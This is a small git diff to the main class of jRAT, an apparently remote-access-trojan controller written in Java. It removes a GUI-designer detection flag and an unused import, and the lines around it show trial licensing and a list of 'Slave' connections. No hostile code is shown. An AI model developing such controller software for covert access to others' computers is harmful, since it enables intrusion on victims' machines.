@@ -28,14 +28,12 @@ import pro.jrat.threads.ThreadPing;
 import pro.jrat.ui.frames.Frame;
 import pro.jrat.ui.frames.FrameAd;
 import pro.jrat.ui.frames.FrameEULA;
-import pro.jrat.ui.frames.FrameErrorDialog;
 import pro.jrat.utils.TrayIconUtils;
 
 public class Main {
 
 	public static boolean trial = true;
 	public static boolean debug;
-	public static boolean designerMode;
 
 	public static final List<Slave> connections = new ArrayList<Slave>();
 	public static Frame instance;
@@ -50,8 +48,6 @@ public class Main {
 			System.out.println("Wrote key to jrat.key");
 			System.exit(0);
 		}
-
-		designerMode = FrameErrorDialog.getStackTrace(new RuntimeException()).contains("com.instantiations.designer");
 
 		try {
 			boolean validated = UniqueId.validate(argsContains(args, "-showhexkey"));
